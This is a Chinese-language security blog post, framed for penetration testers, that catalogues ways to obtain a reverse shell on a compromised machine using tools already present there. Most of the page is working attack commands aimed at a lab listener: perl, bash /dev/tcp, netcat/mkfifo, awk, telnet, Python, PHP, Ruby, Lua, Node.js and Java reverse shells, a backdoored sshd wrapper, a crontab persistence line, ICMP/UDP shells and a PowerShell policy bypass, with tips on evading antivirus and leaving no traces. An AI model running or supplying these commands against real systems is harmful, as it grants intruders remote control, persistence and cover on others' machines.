<!DOCTYPE html>
<html lang=zh>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="0x01 前奏说明&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;很多时候,不到万不得已的情况下,我们完全没必要非往目标机器里传一堆工具,先不说由于各种防护[不仅仅是杀软的问题],传工具困难重重,有时由于自己的粗心,走的时候很容易把各种工具落在目标机器上,万一哪天被人看见,一看工具就大概知道你上来都干了啥,尤其是很多小伙伴在用别人工具时候也不爱做点儿什么手脚,后果你自然是很懂的,嘿嘿……其实,我一">
<meta name="keywords" content="reverse shell">
<meta property="og:type" content="article">
<meta property="og:title" content="你和目标只差一个shell的距离">
<meta property="og:url" content="https://apt404.github.io/2016/09/28/revese-shell/index.html">
<meta property="og:site_name" content="APT404-不疯不魔怎么活">
<meta property="og:description" content="0x01 前奏说明&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;很多时候,不到万不得已的情况下,我们完全没必要非往目标机器里传一堆工具,先不说由于各种防护[不仅仅是杀软的问题],传工具困难重重,有时由于自己的粗心,走的时候很容易把各种工具落在目标机器上,万一哪天被人看见,一看工具就大概知道你上来都干了啥,尤其是很多小伙伴在用别人工具时候也不爱做点儿什么手脚,后果你自然是很懂的,嘿嘿……其实,我一">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="https://apt404.github.io/img/linux_perl.png">
<meta property="og:image" content="https://apt404.github.io/img/linux_dev_tcp.png">
<meta property="og:image" content="https://apt404.github.io/img/linux_sshd_shell1.png">
<meta property="og:image" content="https://apt404.github.io/img/linux_sshd_shell2.png">
<meta property="og:image" content="https://apt404.github.io/img/linux_sshd_shell3.png">
<meta property="og:image" content="https://apt404.github.io/img/linux_sshd_wrapper.png">
<meta property="og:image" content="https://apt404.github.io/img/linux_bash_mkfifo.png">
<meta property="og:image" content="https://apt404.github.io/img/linux_awk.png">
<meta property="og:image" content="https://apt404.github.io/img/linux_telnet_two.png">
<meta property="og:image" content="https://apt404.github.io/img/linux_telnet_mknod.png">
<meta property="og:image" content="https://apt404.github.io/img/linux_py.png">
<meta property="og:image" content="https://apt404.github.io/img/linux_sshd_croantab.png">
<meta property="og:image" content="https://apt404.github.io/img/linux_sshd_php.png">
<meta property="og:image" content="https://apt404.github.io/img/linux_ruby_shell.png">
<meta property="og:image" content="https://apt404.github.io/img/linux_lua_shell.png">
<meta property="og:image" content="https://apt404.github.io/img/linux_c_shell.png">
<meta property="og:image" content="https://apt404.github.io/img/linux_icmp_shell.png">
<meta property="og:image" content="https://apt404.github.io/img/linux_udp_shell.png">
<meta property="og:image" content="https://apt404.github.io/img/linux_mini_shell.png">
<meta property="og:image" content="https://apt404.github.io/img/linux_minrev_shell.png">
<meta property="og:image" content="https://apt404.github.io/img/linux_poewrcat_shell.png">
<meta property="og:updated_time" content="2017-12-19T06:10:04.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="你和目标只差一个shell的距离">
<meta name="twitter:description" content="0x01 前奏说明&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;很多时候,不到万不得已的情况下,我们完全没必要非往目标机器里传一堆工具,先不说由于各种防护[不仅仅是杀软的问题],传工具困难重重,有时由于自己的粗心,走的时候很容易把各种工具落在目标机器上,万一哪天被人看见,一看工具就大概知道你上来都干了啥,尤其是很多小伙伴在用别人工具时候也不爱做点儿什么手脚,后果你自然是很懂的,嘿嘿……其实,我一">
<meta name="twitter:image" content="https://apt404.github.io/img/linux_perl.png">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>你和目标只差一个shell的距离</title>
    <!-- styles -->
    <link rel="stylesheet" href="/css/style.css">
    <!-- persian styles -->
    
      <link rel="stylesheet" href="/css/rtl.css">
    
    <!-- rss -->
    
    
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/Search/">Search</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2016/10/05/hidden-webshell/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2016/09/27/install-py27-on-centos/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://apt404.github.io/2016/09/28/revese-shell/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https://apt404.github.io/2016/09/28/revese-shell/&text=你和目标只差一个shell的距离"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://apt404.github.io/2016/09/28/revese-shell/&title=你和目标只差一个shell的距离"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://apt404.github.io/2016/09/28/revese-shell/&is_video=false&description=你和目标只差一个shell的距离"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=你和目标只差一个shell的距离&body=Check out this article: https://apt404.github.io/2016/09/28/revese-shell/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https://apt404.github.io/2016/09/28/revese-shell/&title=你和目标只差一个shell的距离"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https://apt404.github.io/2016/09/28/revese-shell/&title=你和目标只差一个shell的距离"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://apt404.github.io/2016/09/28/revese-shell/&title=你和目标只差一个shell的距离"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https://apt404.github.io/2016/09/28/revese-shell/&title=你和目标只差一个shell的距离"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://apt404.github.io/2016/09/28/revese-shell/&name=你和目标只差一个shell的距离&description=&lt;p&gt;&lt;br&gt;&lt;br&gt;0x01 前奏说明&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;很多时候,不到万不得已的情况下,我们完全没必要非往目标机器里传一堆工具,先不说由于各种防护[不仅仅是杀软的问题],传工具困难重重,有时由于自己的粗心,走的时候很容易把各种工具落在目标机器上,万一哪天被人看见,一看工具就大概知道你上来都干了啥,尤其是很多小伙伴在用别人工具时候也不爱做点儿什么手脚,后果你自然是很懂的,嘿嘿……其实,我一直都建议,如果能利用目标系统自身的环境或者工具帮我们搞定的,最好就直接用那个,也省去了不少的麻烦,比如,最简单的,利用目标系统中自带的各种工具及语言环境帮我们弹回一个简单的可交互shell, 有shell,’夫何求’, 没错,你肯定会说,不就一个shell嘛,我直接用 coablt strike &amp;amp; msf 岂不更好,嘿嘿……其实,这里并不存在争论的点,不错,它俩确实挺好,不过,恶劣的环境总是有的,有时想把它俩用上确实比较费劲,好了,前戏就到此为止吧,下面我们就直奔主题……&lt;/p&gt;
&lt;p&gt;0x02 大致环境&lt;br&gt;&lt;figure class=&#34;highlight plain&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;win7          192.168.1.128&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;centos6.8     192.168.1.129&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;win2008R2     192.168.1.131&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;kali          192.168.1.147&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;0x03 关于linux平台下弹shell的一些方式&lt;/p&gt;
&lt;p&gt;利用perl的socket,也是个人比较推荐的方式,因为现今几乎所有主流的linux发行版都已经装好了perl,细心的你也许会发现很多大马里弹shell的选项中一般都会有perl,后面bash -i的意思就是执行一个可交互的shell&lt;br&gt;&lt;figure class=&#34;highlight plain&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;C:\&amp;gt;nc -lvp 53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# perl -e &amp;apos;use Socket;$i=&amp;quot;192.168.1.128&amp;quot;;$p=53;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&amp;quot;tcp&amp;quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&amp;#123;open(STDIN,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);open(STDOUT,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);open(STDERR,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);exec(&amp;quot;/bin/bash -i&amp;quot;);&amp;#125;;&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/img/linux_perl.png&#34; alt=&#34;&amp;#39;&amp;#39;&#34;&gt;&lt;br&gt;&lt;br&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      
    </div>
  </span>
</div>

    
    <div class="content index my4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        你和目标只差一个shell的距离
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">klion</span>
      </span>
      
    <div class="postdate">
        <time datetime="2016-09-28T02:13:41.000Z" itemprop="datePublished">2016-09-28</time>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link" href="/tags/reverse-shell/">reverse shell</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <p><br><br>0x01 前奏说明<br>&nbsp;&nbsp;&nbsp;&nbsp;很多时候,不到万不得已的情况下,我们完全没必要非往目标机器里传一堆工具,先不说由于各种防护[不仅仅是杀软的问题],传工具困难重重,有时由于自己的粗心,走的时候很容易把各种工具落在目标机器上,万一哪天被人看见,一看工具就大概知道你上来都干了啥,尤其是很多小伙伴在用别人工具时候也不爱做点儿什么手脚,后果你自然是很懂的,嘿嘿……其实,我一直都建议,如果能利用目标系统自身的环境或者工具帮我们搞定的,最好就直接用那个,也省去了不少的麻烦,比如,最简单的,利用目标系统中自带的各种工具及语言环境帮我们弹回一个简单的可交互shell, 有shell,’夫何求’, 没错,你肯定会说,不就一个shell嘛,我直接用 coablt strike &amp; msf 岂不更好,嘿嘿……其实,这里并不存在争论的点,不错,它俩确实挺好,不过,恶劣的环境总是有的,有时想把它俩用上确实比较费劲,好了,前戏就到此为止吧,下面我们就直奔主题……</p>
<p>0x02 大致环境<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">win7          192.168.1.128</span><br><span class="line">centos6.8     192.168.1.129</span><br><span class="line">win2008R2     192.168.1.131</span><br><span class="line">kali          192.168.1.147</span><br></pre></td></tr></table></figure></p>
<p>0x03 关于linux平台下弹shell的一些方式</p>
<p>利用perl的socket,也是个人比较推荐的方式,因为现今几乎所有主流的linux发行版都已经装好了perl,细心的你也许会发现很多大马里弹shell的选项中一般都会有perl,后面bash -i的意思就是执行一个可交互的shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;nc -lvp 53</span><br><span class="line"># perl -e &apos;use Socket;$i=&quot;192.168.1.128&quot;;$p=53;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/bash -i&quot;);&#125;;&apos;</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/linux_perl.png" alt="&#39;&#39;"><br><br><a id="more"></a><br>利用系统特殊设备文件/dev/tcp[当然,有这种特性的文件并不止这一个],语句的意思其实很简单,通俗点儿讲就是把bash的数据全部通多/dev/tcp建立的socket发过去,以此来达到反弹shell的效果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;nc -lvp 80</span><br><span class="line"># /bin/bash -i &gt;&amp; /dev/tcp/192.168.1.128/80 0&gt;&amp;1</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/linux_dev_tcp.png" alt="&#39;&#39;"><br></p>
<p>利用sshd来反弹shell,ln -f的意思就是把原有的数据清空,整体语句的意思通俗点儿讲,就是把sshd绑定在本地的8080端口上,这样当别人从8080这个端口进来的时候就相当于直接进到本机的sshd中,-o就是去掉第一次ssh连接的那个密钥对提示,像这种正向连,有个非常不好的地方,防火墙只要阻断你这个端口的数据通信就基本废掉了</p>
<p>第一种方式:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># netstat -tulnp | grep &quot;8080&quot;</span><br><span class="line"># ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=8080;</span><br><span class="line"># netstat -tulnp | grep &quot;8080&quot;</span><br><span class="line"># ssh root@192.168.1.129 -p 8080      一定要注意在自己本地机器上用这个端口去连</span><br><span class="line"># pkill su</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/linux_sshd_shell1.png" alt="&#39;&#39;"><br><img src="/img/linux_sshd_shell2.png" alt="&#39;&#39;"><br><img src="/img/linux_sshd_shell3.png" alt="&#39;&#39;"><br></p>
<p>第二种方式,注意这里的socat连接的端口,默认是13377端口,关于socat,这里就不多做介绍了,一个高级端口转发工具,当然,并不只是转发那么简单,想必小伙伴们应该也用的比较多了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># cd /usr/sbin/</span><br><span class="line"># mv sshd ../bin/</span><br><span class="line"># echo &apos;#!/usr/bin/perl&apos; &gt;sshd</span><br><span class="line"># echo &apos;exec &quot;/bin/sh&quot; if (getpeername(STDIN) =~ /^..4A/);&apos; &gt;&gt;sshd</span><br><span class="line"># echo &apos;exec &#123;&quot;/usr/bin/sshd&quot;&#125; &quot;/usr/sbin/sshd&quot;,@ARGV,&apos; &gt;&gt;sshd</span><br><span class="line"># chmod u+x sshd</span><br><span class="line"># /etc/init.d/sshd restart</span><br><span class="line"># socat STDIO TCP4:192.168.1.129:22,sourceport=13377</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/linux_sshd_wrapper.png" alt="&#39;&#39;"><br></p>
<p>利用最古老的nc来反弹,但默认正常发行版中默认带的那个nc都是阉割版的,即没有-e选项,也就意味着不能直接用它反弹shell,好在强大的linux为我们提供了一个建立管道的工具mkfifo和bash本身的各种管道特性,我们就可以利这种方式,把bash的数据通过管道反弹走</p>
<p>普通nc反弹<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;nc -lvp 8080</span><br><span class="line"># rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.1.128 8080 &gt;/tmp/f</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/linux_bash_mkfifo.png" alt="&#39;&#39;"><br></p>
<p>加密版的netcat = ‘cryptcat’,可以设置连接密码,用-k指定下即可,kali默认自带,如果是目标机器,可能需要你自己手工动装一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># cryptcat -vv -l -p 25 -k sec</span><br><span class="line"># cryptcat -vv -l -p 80 -k sec</span><br><span class="line"># cryptcat 192.168.12.141 80 -k sec|cmd.exe|cryptcat 192.168.12.141 25 -k sec</span><br></pre></td></tr></table></figure></p>
<p>利用awk或gawk来反弹shell,awk就不用多说了吧,linux文本处理三剑客的老大,语句的意思也非常简单,就是循环发socket<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># awk &apos;BEGIN&#123;s=&quot;/inet/tcp/0/192.168.1.128/8080&quot;;for(;s|&amp;getline c;close(c))while(c|getline)print|&amp;s;close(s)&#125;&apos;</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/linux_awk.png" alt="&#39;&#39;"><br></p>
<p>利用系统自带的telnet客户端来反弹shell,一般运维默认都会把它装上<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">第一种</span><br><span class="line">C:\&gt;nc -vlp 1080   命令结果显示窗口</span><br><span class="line">C:\&gt;nc -lvp 8080   命令传输窗口</span><br><span class="line"># telnet 192.168.1.128 8080 | /bin/bash | telnet 192.168.1.128 1080</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/linux_telnet_two.png" alt="&#39;&#39;"><br></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">第二种</span><br><span class="line">C:\&gt;nc -lvp 8080</span><br><span class="line"># mknod test p &amp;&amp; telnet 192.168.1.128  8080 0&lt;test | /bin/bash 1&gt;test</span><br></pre></td></tr></table></figure>
<p><img src="/img/linux_telnet_mknod.png" alt="&#39;&#39;"><br></p>
<p>利用py反弹shell,就像perl在绝大多数发行版上都已经自带,但默认是2.6.6,不过,对我们来说,足矣,当然啦,这里只是用最简单的py的socket来反弹一个shell,关于其它的更高级的py reverse_shell 这里就不说了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;nc -lvp 8080</span><br><span class="line"># python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.1.128&quot;,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&apos;</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/linux_py.png" alt="&#39;&#39;"><br></p>
<p>利用crontab定时反弹shell,很容被发现,临时用用还行,至于用什么反弹,随意,perl,py都行,你喜欢,用完以后记得立马删掉<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;nc -lvp 8080</span><br><span class="line"># (crontab -l;printf &quot;* * * * *  /usr/bin/python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;192.168.1.128\&quot;,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&apos;\n&quot;)|crontab -</span><br><span class="line"># crontab -e</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/linux_sshd_croantab.png" alt="&#39;&#39;"><br></p>
<p>利用php的socket来反弹,对于php的网站,也许我们可以利用上,也是很多php大马里默认的反弹方式,当然,除了php脚本,别的web后端脚本其实都可以被利用,比如,jsp…<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;nc -lvp 8080</span><br><span class="line"># /usr/local/php/bin/php -r &apos;$sock=fsockopen(&quot;192.168.1.128&quot;,8080);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/linux_sshd_php.png" alt="&#39;&#39;"><br></p>
<p>如果目标机器上有java环境,那就更好了,直接用java来弹,效果一般还是非常好的,而且java的免杀效果也很不错哦,把下面的代码打成jar包就可以了,记得打之前改下里面要反弹到的ip和端口<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;nc -lvp 8080</span><br><span class="line"></span><br><span class="line">public class Revs &#123;</span><br><span class="line">    /**</span><br><span class="line">    * @param args</span><br><span class="line">    * @throws Exception </span><br><span class="line">    */</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        // TODO Auto-generated method stub</span><br><span class="line">        Runtime r = Runtime.getRuntime();</span><br><span class="line">        String cmd[]= &#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/192.168.1.128/8080;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;&#125;;</span><br><span class="line">        Process p = r.exec(cmd);</span><br><span class="line">        p.waitFor();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>利用ruby的socket来反弹shell:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;nc -lvp 8080</span><br><span class="line"># ruby -rsocket -e &apos;exit if fork;c=TCPSocket.new(&quot;192.168.1.128&quot;,&quot;8080&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&apos;</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/linux_ruby_shell.png" alt="&#39;&#39;"><br></p>
<p>利用lua的socket来反弹shell:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">c:\nc -lvp 8080</span><br><span class="line"># apt-get install lua50 -y</span><br><span class="line"># apt-get install luarocks -y</span><br><span class="line"># luarocks install luasocket</span><br><span class="line"># lua -e &quot;require(&apos;socket&apos;);require(&apos;os&apos;);t=socket.tcp();t:connect(&apos;192.168.1.128&apos;,&apos;8080&apos;);os.execute(&apos;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&apos;);&quot;</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/linux_lua_shell.png" alt="&#39;&#39;"><br></p>
<p>利用nodejs反弹shell:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;nc -lvp 8080</span><br><span class="line">(function()&#123;</span><br><span class="line">    var net = require(&quot;net&quot;),</span><br><span class="line">    cp = require(&quot;child_process&quot;),</span><br><span class="line">    sh = cp.spawn(&quot;/bin/sh&quot;, []);</span><br><span class="line">    var client = new net.Socket();</span><br><span class="line">    client.connect(8080, &quot;10.17.26.64&quot;, function()&#123;</span><br><span class="line">        client.pipe(sh.stdin);</span><br><span class="line">        sh.stdout.pipe(client);</span><br><span class="line">        sh.stderr.pipe(client);</span><br><span class="line">    &#125;);</span><br><span class="line">    return /a/;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure></p>
<p>c版的reverse_shell:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;nc -lvp 8080</span><br><span class="line"># gcc c_revese_shell.c -o cshell</span><br><span class="line"># ./cshell 192.168.1.128 8080</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/linux_c_shell.png" alt="&#39;&#39;"><br></p>
<p>利用gcc反弹shell:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">抱歉,自己在本地暂时还没成功,待续....</span><br></pre></td></tr></table></figure></p>
<p>0x04 基于不同协议下的shell反弹方式</p>
<p>利用icmp来反弹shell,需要你自己先编译下,会生成两个文件,一个服务端[ishd]一个客户端[ish],自己有兴趣可以拿wireshark看下,通常用来穿透高层防火墙<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># make linux</span><br><span class="line"># ./ishd -i 6555 -t 0 -p 8080</span><br><span class="line"># ./ish -i 6555 -t 0 -p 8080 192.168.1.129[这里的ip可以换成域名]</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/linux_icmp_shell.png" alt="&#39;&#39;"><br></p>
<p>利用udp来反弹shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;nc -l -p 53 -u     注意这里务必要用udp的模式来接</span><br><span class="line"># python udpshell.py 192.168.1.128 53 udp</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/linux_udp_shell.png" alt="&#39;&#39;"><br></p>
<p>利用dns来反弹shell的方式,就不说了吧,详情可自行参考cobalt strike,那可能是现今最好的dns隧道学习样例</p>
<p>0x05 关于win平台下的一些shell反弹方式</p>
<p>除了上面这些可以通用的语言反弹shell之外,可能最重要的就是powershell了,当然啦,如果你说vbs更好,那我也没啥好说的了,毕竟自己平时遇到03以下的系统实在是太少了,可能以后也会越来越少,人总要向前看嘛<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;nc -lvp 8080</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">记得到脚本里面去把要反弹到的ip和端口改一下,另外,可能是因为cmd默认的字符集[gbk]所以才会乱码,如果是英文系统就不会了</span><br><span class="line"># powershell –exec bypass –Command &quot;&amp; &#123;Import-Module &apos;C:\mini-reverse.ps1&apos;&#125;&quot;</span><br></pre></td></tr></table></figure>
